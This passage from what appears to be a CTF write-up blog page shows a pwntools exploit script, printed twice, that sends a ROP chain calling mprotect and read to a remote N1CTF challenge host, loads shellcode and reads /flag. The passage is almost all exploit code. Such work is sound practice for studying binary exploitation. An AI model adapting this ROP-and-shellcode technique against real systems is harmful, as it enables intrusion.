style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">call</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><br><span style="color:#AB5959">    b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">138</span><span style="color:#999999">,</span><br><span style="color:#393A34">    call3</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">400000</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">2000</span><span style="color:#999999">,</span><span style="color:#2F798A"> 7</span><span style="color:#999999">,</span><span style="color:#A65E2B"> MPROTECT</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><br><span style="color:#393A34">    call3</span><span style="color:#1e754f">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">400000</span><span style="color:#999999">,</span><span style="color:#998418"> len</span><span style="color:#a65e2b">(</span><span style="color:#A65E2B">SC</span><span style="color:#a65e2b">)</span><span style="color:#999999">,</span><span style="color:#A65E2B"> READ</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><br><span style="color:#393A34">    p64</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">400000</span><span style="color:#1e754f">)</span><br><span style="color:#2993a3">]</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">''</span><span style="color:#999999">.</span><span style="color:#393A34">join</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">(Ctrl+D to exit):</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">time</span><span style="color:#999999">.</span><span style="color:#393A34">sleep</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">util</span><span style="color:#999999">.</span><span style="color:#393A34">fiddling</span><span style="color:#999999">.</span><span style="color:#393A34">tty_escape</span><span style="color:#1e754f">(</span><span style="color:#393A34">payload</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">pause</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">util</span><span style="color:#999999">.</span><span style="color:#393A34">fiddling</span><span style="color:#999999">.</span><span style="color:#393A34">tty_escape</span><span style="color:#1e754f">(</span><span style="color:#A65E2B">SC</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">pause</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">/flag</span><span style="color:#B5695977">'</span><span style="color:#999999">.</span><span style="color:#393A34">rjust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">256</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">/</span><span style="color:#B5695977">'</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> os</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> time</span><br><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">arch </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">amd64</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">p </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">n1ctf.2025.remote</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 13227</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#4D9375"> True</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">use `kctf-pow solve` to prove yourself :)</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">    pow</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#5eaab5">(</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    ans </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> os</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">popen</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'./kctf-pow solve </span><span style="color:#4d9375">{</span><span style="color:#B8A965">pow</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">read</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">ans</span><span style="color:#5eaab5">)</span><br><br><span style="color:#C99076">MPROTECT</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 5488848</span><br><span style="color:#C99076">READ</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 5485696</span><br><span style="color:#C99076">SC</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">lea rbp,[rsp-512]</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> +</span><br><span style="color:#DBD7CAEE">         shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">read</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">rbp</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 256</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><br><span style="color:#DBD7CAEE">         shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">write</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">rbp</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 256</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><br><span style="color:#C98A7D77">         '</span><span style="color:#C98A7D">mov rsi,1</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> +</span><br><span style="color:#DBD7CAEE">         shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">shutdown</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">3</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><br><span style="color:#DBD7CAEE">         shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">read</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">rbp</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 256</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><br><span style="color:#DBD7CAEE">         shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">write</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">rbp</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 256</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><br><span style="color:#C98A7D77">         "</span><span style="color:#C98A7D">int3</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> call3</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">a1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> a2</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> a3</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> call</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">407630</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">a1</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">44ccfe</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">a2</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">4bdf0c</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">a3</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">call</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><br><span style="color:#CB7676">    b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">138</span><span style="color:#666666">,</span><br><span style="color:#DBD7CAEE">    call3</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">400000</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">2000</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 7</span><span style="color:#666666">,</span><span style="color:#C99076"> MPROTECT</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><br><span style="color:#DBD7CAEE">    call3</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">400000</span><span style="color:#666666">,</span><span style="color:#B8A965"> len</span><span style="color:#d4976c">(</span><span style="color:#C99076">SC</span><span style="color:#d4976c">)</span><span style="color:#666666">,</span><span style="color:#C99076"> READ</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><br><span style="color:#DBD7CAEE">    p64</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">400000</span><span style="color:#4d9375">)</span><br><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">''</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">join</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">(Ctrl+D to exit):</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">time</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sleep</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">util</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">fiddling</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">tty_escape</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">pause</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">util</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">fiddling</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">tty_escape</span><span style="color:#4d9375">(</span><span style="color:#C99076">SC</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">pause</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">/flag</span><span style="color:#C98A7D77">'</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">rjust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">256</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">/</span><span style="color:#C98A7D77">'</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">ä¿æŒè”ç³»</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">Â·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">Â·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>æœ¬ç«™åŸºäº
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
æ”¹é€ ï¼Œé™¤ç‰¹åˆ«è¯´æ˜å¤–å†…å®¹ä»¥ CC BY 4.0 åè®®å…±äº«ã€‚</p></span></div></footer></body></html>